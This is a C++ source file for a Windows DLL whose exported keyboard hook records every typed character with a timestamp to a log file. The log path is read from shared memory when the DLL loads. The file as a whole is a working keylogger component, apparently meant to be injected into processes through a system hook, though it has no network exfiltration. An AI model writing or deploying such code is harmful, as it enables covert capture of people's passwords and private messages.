// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>
#include <string>
#include <vector>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <iostream>
#include <stdio.h>
#include <fstream>
#include <thread>

BOOL ReadStringFromSharedMemoryAndDisplay(std::wstring* source, const std::wstring& key);
std::wstring logFilePath;
std::wofstream logFile;
HINSTANCE hInstance;
HHOOK hHook;
// Function to log keystrokes and nCode
extern "C" __declspec(dllexport) void setFilePath(const std::wstring& filePath)
{
	// Deep copy the provided file path to the global variable
	logFilePath = filePath;
}
std::wstring FormatterString(std::wstring& keyStr) {

	// Get the current time
	auto now = std::chrono::system_clock::now();
	auto in_time_t = std::chrono::system_clock::to_time_t(now);
	auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;

	struct tm timeinfo;
	localtime_s(&timeinfo, &in_time_t);

	std::wstringstream ss;
	ss << std::put_time(&timeinfo, L"%d/%m/%Y %H:%M:%S")
		<< L"." << std::setw(3) << std::setfill(L'0') << ms.count();

	std::wstring timestamp = ss.str();

	// Format the final log string
	std::wstringstream finalLog;
	finalLog << L"['" << keyStr << L"', " << timestamp << L"]";

	return finalLog.str();
}

/*
BOOL CreateThread() {
	HANDLE hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
	if (hThread == NULL) {
		MessageBoxW(NULL, L"Failed to create thread", L"Error", MB_OK | MB_ICONERROR);
		return FALSE;
	}
}
*/
extern "C" __declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		// Decode lParam to get key event details
		DWORD vkCode = wParam;
		DWORD scanCode = (lParam >> 16) & 0xFF;
		BOOL extended = (lParam >> 24) & 0x01;
		BOOL previousState = (lParam >> 30) & 0x01;
		BOOL transitionState = (lParam >> 31) & 0x01;

		if ((lParam & 0x80000000) == 0) { // Key press
			std::wstringstream keystrokes;
			keystrokes << L"Key press - Key code: " << vkCode << std::endl;
			keystrokes << L"Scan code: " << scanCode << std::endl;
			keystrokes << L"Extended key: " << extended << std::endl;
			keystrokes << L"Previous state: " << previousState << std::endl;
			keystrokes << L"Transition state: " << transitionState << std::endl;

			// Write to log file or output (replace with your logging mechanism)

			wchar_t buffer[5] = { 0 };
			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);
			std::wstringstream key;
			// Translate the virtual key code to a character
			int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);
			if (result > 0) {

				key << buffer;
				std::wcout << key.str() << std::endl;
				std::wstring key_str = key.str();
				wchar_t key2 = L'K';
				//MessageBox(NULL, L"Your message here", logFilePath.c_str(), MB_OK);
				logFile.open(logFilePath, std::ios_base::app);
				logFile << FormatterString(key_str) << std::endl;
				logFile.close();
			}
		}
	}

	// Call the next hook in the chain
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		hInstance = hModule;
		ReadStringFromSharedMemoryAndDisplay(&logFilePath, L"MySharedMemory");
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


// Function to read a string from shared memory and display it in a message box
BOOL ReadStringFromSharedMemoryAndDisplay(std::wstring* source, const std::wstring& key) {
	HANDLE hMapFile = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, key.c_str());
	if (hMapFile == NULL) {
		// Handle error
		return FALSE;
	}

	// Read data from shared memory
	PTCHAR pData = (PTCHAR)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(TCHAR) * MAX_PATH);
	if (pData == NULL) {
		// Handle error
		CloseHandle(hMapFile);
		return FALSE;
	}
	std::wstring dataString(pData);
	*source = dataString;

	// Unmap the view and close handles
	UnmapViewOfFile(pData);
	CloseHandle(hMapFile);
}
